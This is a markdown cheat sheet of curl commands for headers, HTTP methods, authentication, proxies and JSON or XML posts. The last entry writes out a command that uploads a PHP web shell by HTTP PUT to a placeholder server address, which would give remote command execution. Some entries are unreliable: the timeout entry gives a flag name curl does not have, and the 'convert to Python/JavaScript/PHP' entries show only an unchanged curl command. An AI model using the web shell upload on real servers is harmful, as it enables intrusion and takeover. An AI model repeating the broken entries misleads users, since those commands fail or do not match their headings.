---
title: Basics
date: {{ date }}
background: bg-green-400
icon: curl
tags:
- curl
categories:
- Linux Command
intro: A quick cheat sheet for curl
plugins:
- copyCode
---

Curl Basics
---------------

### Get header
```shell script
$ curl -i <URL>
```

### Follow redirects
```shell script
$ curl -L <URL>
```

### Ignore ssl error
```shell script
$ curl -k <URL>
```

### Specific HTTP Method
```shell script
$ curl -XPOST <URL>
$ curl -XPUT <URL>
$ curl -XDELETE <URL>
```

Set values
-----------

### Cookie
```shell script {.wrap}
curl --cookie "Name=Value" <URL>
```

### User Agent
```shell script {.wrap}
curl -A "ReqBin Curl Client/1.0" <URL>
```
### Custom Header
```shell script {.wrap}
curl -H "X-Custom-Header: value" <URL>
```
### Basic auth
```shell script {.wrap}
curl -u "login:password" <URL>
```

Parameters
-----------

### Connection timeout
```shell script {.wrap}
curl --connection-timeout 5 <URL>
```

### Post Json Curl
```shell script {.wrap}
curl -X POST <URL> -H 'Content-Type: application/json' -d '{"login":"my_login","password":"my_password"}'
```

### Post with body curl
```shell script {.wrap}
curl -X POST <URL> -H "Content-Type: application/json" -d '{"productId": 123456, "quantity": 100}'
```

### Post file using curl
```shell script {.wrap}
curl -d @data.json <URL>
```

### Curl through proxy
```shell script {.wrap}
curl <URL> -x myproxy.com:8080 -U login:password
```

### Curl with bearer token authrizaion header
```shell script {.wrap}
curl <URL> -H "Accept: application/json" -H "Authorization: Bearer {token}"
```

### Curl fetching json
```shell script {.wrap}
curl <URL> -H "Accept: application/json"
```

### Post form data with curl
```shell script {.wrap}
curl -X POST <URL> -H "Content-Type: application/x-www-form-urlencoded" -d "param1=value1&param2=value2"
```

### Set Content type curl
```shell script {.wrap}
curl -X POST <URL> -H 'Content-Type: application/json' -H 'Accept: application/json' -d '{"Id": 78912, "Quantity": 1, "Price": 19.00}'
```

### Post XML with curl
```shell script {.wrap}
curl -X POST <URL> -H "Content-Type: application/xml" -H "Accept: application/xml" -d "<Request><Login>my_login</Login><Password>my_password</Password></Request>"
```

### Curl fetch XML
```shell script {.wrap}
curl <URL> -H "Accept: application/xml"
```

### Curl send PUT request
```shell script {.wrap}
curl -X PUT <URL> -d "PUT request data"
```

### Curl send DELETE request
```shell script {.wrap}
curl -X DELETE <URL> -H "Accept: application/json"
```

### Curl send OPTIONS request
```shell script {.wrap}
curl https://api.reqbin.com/api/v1/requests -X OPTIONS -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: content-type" -H "Origin: https://reqbin.com"
```

### Curl send CORS request
```shell script {.wrap}
curl -H "Origin: https://example.reqbin.com" https://sample-site.com
```

### Curl convert to PYTHON
```shell script {.wrap}
curl -X POST <URL> -H "Content-Type: application/json" -d "{\"login\":\"my_login\",\"password\":\"my_password\"}"
```

### Curl convert to Javascript / AJAX Calls
```shell script {.wrap}
curl -X POST <URL> -H "Content-Type: application/json" -d "{\"login\":\"my_login\",\"password\":\"my_password\"}"
```

### Curl convert to PHP
```shell script {.wrap}
curl -X POST <URL> -H "Content-Type: application/json" -d "{\"login\":\"my_login\",\"password\":\"my_password\"}"
```

### Curl convert to HTTP request
```shell script {.wrap}
curl https://sample-site.com/get/json -H "Content-Type: application/json" -H "Accept: application/json"
```

### Check if it is possible to upload using put
```shell script {.wrap}
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
```